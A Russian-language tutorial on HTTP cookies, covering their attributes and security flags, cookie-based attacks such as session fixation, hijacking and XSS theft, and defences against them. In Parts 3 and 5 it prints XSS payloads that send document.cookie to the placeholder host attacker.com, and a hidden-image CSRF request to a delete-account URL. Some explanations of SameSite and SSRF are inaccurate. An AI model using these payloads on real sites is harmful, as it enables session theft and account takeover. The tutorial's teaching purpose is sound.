Часть 1. Введение в cookies
Cookie — это небольшой фрагмент текста, который веб-сервер отправляет вашему браузеру и который тот сохраняет. При последующих запросах к тому же сайту браузер автоматически отсылает назад все сохранённые cookie.
Задачи cookie на практике:
- Сессии и аутентификация: запоминают, что пользователь уже “зашёл” под своей учёткой.
- Настройки и предпочтения: хранение выбранного языка, темы, размера шрифта.
- Персонализация: корзина покупок, рекомендованные товары и т. д.
Пример создания cookie на HTTP:
HTTP/1.1 200 OK
Set-Cookie: sessionId=xyz123; Path=/; Max-Age=1800

Браузер сохраняет cookie и при следующем запросе отправляет:
GET /profile HTTP/1.1
Host: example.com
Cookie: sessionId=xyz123
Где хранятся cookie и их виды:
- Session cookies: хранятся в памяти браузера, удаляются при закрытии.
- Persistent cookies: сохраняются на диске до истечения Max-Age или удаления пользователем.

Пример на JavaScript:
document.cookie = "userRole=admin; Max-Age=" + 60*60 + "; Path=/";
console.log(document.cookie);
Часть 2. Атрибуты и флаги cookies
Помимо имени и значения, cookie может нести дополнительные параметры (атрибуты). Они управляют, где, когда и как cookie используется.
Основные атрибуты:
1. Domain: определяет домен (например, .example.com – действует на домен и все поддомены).
2. Path: ограничивает область действия (например, /shop/ – только для путей с /shop/).
3. Expires/Max-Age: фиксированная дата или время жизни в секундах.

Флаги безопасности:
1. Secure: передаётся только по HTTPS.
2. HttpOnly: недоступна для JavaScript (document.cookie).
3. SameSite: контролирует отправку при кросс-доменных запросах (Strict, Lax, None).

Примеры:
- Безопасная сессионная cookie:
  Set-Cookie: sessionId=xyz; Path=/; Secure; HttpOnly; SameSite=Lax
- Persistent cookie с областью поддомена:
  Set-Cookie: userPref=dark; Domain=.example.com; Path=/; Max-Age=2592000
Часть 3. Атаки на аутентификацию с использованием cookies
Обзор атак на аутентификацию с cookies
Cookies часто используются для управления сессиями в веб-приложениях, и их безопасность играет важную роль в защите от атак на аутентификацию. Если cookie, связанная с сессией, может быть украдена, подделана или угнана, злоумышленник может получить несанкционированный доступ к аккаунту пользователя. Рассмотрим основные атаки.
1. Session Fixation
Описание:
Session Fixation — это атака, при которой злоумышленник заставляет пользователя использовать заранее сгенерированное значение сессионного идентификатора (cookie), которое потом может быть использовано для захвата сессии. Это может быть сделано через ссылку, параметр URL или вредоносный сайт.
Пример:
1. Злоумышленник генерирует сессию с определённым значением:
   Set-Cookie: sessionId=abc123; Path=/; HttpOnly
2. Он отправляет жертве ссылку с этим значением:
   <a href="https://example.com/login?sessionId=abc123">Click here to login</a>
3. Когда жертва заходит по этой ссылке, сервер устанавливает тот же sessionId для её сессии. Теперь злоумышленник может использовать этот sessionId для доступа к аккаунту жертвы.
Как предотвратить:
- Генерировать новый sessionId после успешной аутентификации.
- Использовать флаг HttpOnly для защиты от доступа через JavaScript.
- Применять SameSite для защиты от межсайтовых атак.
2. Session Hijacking
Описание:
Session Hijacking — это атака, при которой злоумышленник захватывает действующий sessionId и использует его для получения доступа к аккаунту жертвы. Это можно сделать, перехватив cookie через незащищённое соединение или используя XSS-уязвимости.
Пример:
1. Жертва заходит на сайт по HTTP (не HTTPS), и sessionId передаётся в запросе как cookie:
   Set-Cookie: sessionId=xyz789; Path=/; HttpOnly
2. Злоумышленник, перехватывая трафик (например, через MITM-атаку), может забрать этот cookie и использовать его:
   Cookie: sessionId=xyz789
3. Теперь злоумышленник может получить доступ к сессии жертвы.
Как предотвратить:
- Использовать HTTPS для защиты от MITM-атак.
- Устанавливать флаг Secure для всех cookie, которые передаются через HTTPS.
- Реализовать проверку сессии и перегенерацию идентификатора сессии при важных действиях, например, при смене пароля.
3. Cross-Site Scripting (XSS) и украденные cookies
Описание:
XSS-атаки позволяют злоумышленникам внедрять вредоносный JavaScript в страницы, просматриваемые пользователями. Этот скрипт может украсть cookie сессии и отправить его на сервер злоумышленника.
Пример:
1. Вредоносный скрипт может быть внедрён на страницу:
   <script>
     var cookies = document.cookie;
     fetch('https://attacker.com/steal?cookie=' + cookies);
   </script>
2. Когда пользователь заходит на эту страницу, его cookie отправляется на сервер злоумышленника.
Как предотвратить:
- Использовать флаг HttpOnly, чтобы cookie не было доступно через JavaScript.
- Применять Content Security Policy (CSP) для ограничения выполнения скриптов с ненадёжных источников.
- Регулярно проверять веб-приложения на наличие XSS-уязвимостей и исправлять их.
4. Кража сессионных данных через небезопасное соединение (MITM)
Описание:
Если приложение не использует HTTPS, cookie может быть перехвачено злоумышленником через MITM-атаку (атака 'человек посередине'). Это особенно опасно для сессионных cookie.
Пример:
1. Жертва заходит на сайт через HTTP:
   GET /profile HTTP/1.1
   Host: example.com
   Cookie: sessionId=xyz123
2. Злоумышленник перехватывает этот запрос и получает cookie сессии.
Как предотвратить:
- Использовать только HTTPS для защиты всех запросов, связанных с cookies.
- Применять флаг Secure для всех cookie.

Часть 4. Защита cookies и лучшие практики безопасности
В этой части мы рассмотрим, как можно защитить cookies и какие лучшие практики нужно использовать для обеспечения безопасности приложений.
1. Использование HTTPS
Безопасность cookies начинается с использования HTTPS. Это гарантирует, что данные, включая cookies, будут передаваться через зашифрованное соединение и не могут быть перехвачены злоумышленниками.
Пример:
- Для защиты cookie всегда используйте HTTPS и устанавливайте флаг Secure.
Set-Cookie: sessionId=xyz123; Secure; HttpOnly; SameSite=Strict

2. HttpOnly
Для защиты cookie от кражи через XSS (межсайтовое скриптование), следует использовать флаг HttpOnly. Это предотвращает доступ к cookie через JavaScript, делая его доступным только серверу.
Пример:
Set-Cookie: sessionId=xyz123; HttpOnly; Secure; SameSite=Strict
3. SameSite
SameSite — это атрибут cookie, который определяет, будет ли cookie отправляться в запросах, которые происходят между разными сайтами. Это предотвращает атаки типа Cross-Site Request Forgery (CSRF).
Существует три значения атрибута SameSite:
- Strict: cookie будет отправляться только в рамках одного сайта.
- Lax: cookie будет отправляться при навигации по сайту, но не при отправке форм и других действиях.
- None: cookie будет отправляться всегда, но только если используется HTTPS (и Secure флаг).
Пример:
Set-Cookie: sessionId=xyz123; SameSite=Strict; Secure
4. Установка срока жизни cookies (Max-Age/Expires)
Часто сессионные cookies должны иметь срок действия, после которого они автоматически удаляются. Установка Max-Age (время жизни cookie в секундах) или Expires (конкретная дата и время) помогает избежать утечек данных через устаревшие cookies.
Пример:
Set-Cookie: sessionId=xyz123; Max-Age=3600; Path=/; Secure
5. Защита от угона сессии (Session Hijacking)
Для защиты от атак, связанных с угоном сессии, важно использовать флаги Secure и HttpOnly для всех сессионных cookies. Также можно рассмотреть перегенерацию идентификаторов сессии при каждом новом логине, а также при изменении важных данных пользователя.
Пример:
- Перегенерация sessionId после успешной аутентификации пользователя.
- Применение флагов Secure и HttpOnly для cookies.
6. Ограничение области действия cookies (Domain и Path)
Важно правильно настроить атрибуты Domain и Path, чтобы избежать утечек cookies за пределы нужных областей. Например, если cookie должна действовать только для определённой части сайта, используйте атрибут Path.
Пример:
Set-Cookie: userPref=dark; Domain=example.com; Path=/shop;
Это cookie будет отправляться только для запросов, которые начинаются с /shop.
7. Регулярный мониторинг и аудит cookies
Приложения должны регулярно проверять, какие cookies они используют, и обеспечить их безопасность. Важно внедрить механизмы, которые помогают быстро обнаруживать и устранять уязвимости, связанные с cookies.

Часть 5. Уязвимости cookies и методы их эксплуатации
В этой части мы рассмотрим основные уязвимости, связанные с cookies, и методы их эксплуатации. Понимание этих уязвимостей критически важно для пентестеров, чтобы вовремя обнаружить и устранить их.
1. Межсайтовое скриптование (XSS)
XSS позволяет злоумышленнику внедрить вредоносный JavaScript-код в веб-страницу, который может быть выполнен в браузере жертвы. Если cookies не защищены флагом HttpOnly, злоумышленник может украсть cookie, а затем использовать её для входа в аккаунт пользователя.
Пример эксплуатации:
Злоумышленник может вставить JavaScript в комментарии или другие поля ввода на сайте, чтобы украсть cookies.
Код, который может быть вставлен:
<script>document.location='http://attacker.com/steal_cookie?cookie=' + document.cookie;</script>
После выполнения этого кода cookies жертвы отправятся на сервер злоумышленника.
2. Межсайтовые подделки запросов (CSRF)
CSRF-атаки используют авторизацию, уже выполненную пользователем, для отправки поддельных запросов с использованием его cookies. Это может быть опасно, если SameSite cookie не настроен должным образом или не используется вообще.
Пример эксплуатации:
Злоумышленник может создать фальшивую форму или запрос, который автоматически отправляется от имени пользователя, например, при посещении злонамеренной веб-страницы.
Пример кода для CSRF-атаки:
<img src='https://victim.com/delete_account' style='display:none;' />
3. Угон сессии (Session Hijacking)
Угон сессии — это атака, при которой злоумышленник перехватывает идентификатор сессии (например, cookie) и использует его для получения несанкционированного доступа к аккаунту пользователя. Это возможно, если cookies не защищены флагами Secure и HttpOnly.
Пример эксплуатации:
Злоумышленник может использовать перехваченный cookie в своих запросах, чтобы получить доступ к учётной записи жертвы.
4. Подделка ответа от сервера (Server-Side Request Forgery, SSRF)
В случае неправильно настроенных серверов, SSRF-атака может использовать cookie для отправки запросов на внутренние сервисы. Злоумышленник может получить доступ к чувствительным данным, если сервер не ограничивает адреса, на которые можно отправлять запросы.
Пример эксплуатации:
Злоумышленник может создать запрос с подделанным cookie, чтобы получить доступ к внутренним ресурсам сервера.
5. Утечка cookie через URL
Если cookie включен в URL (например, в строке запроса), она может быть записана в логах серверов, а также попасть в историю браузера. Это приводит к утечке данных и возможной компрометации безопасности пользователя.
Пример эксплуатации:
cookie=xyz123 в URL может быть записано в журнале доступа сервера или в истории браузера.
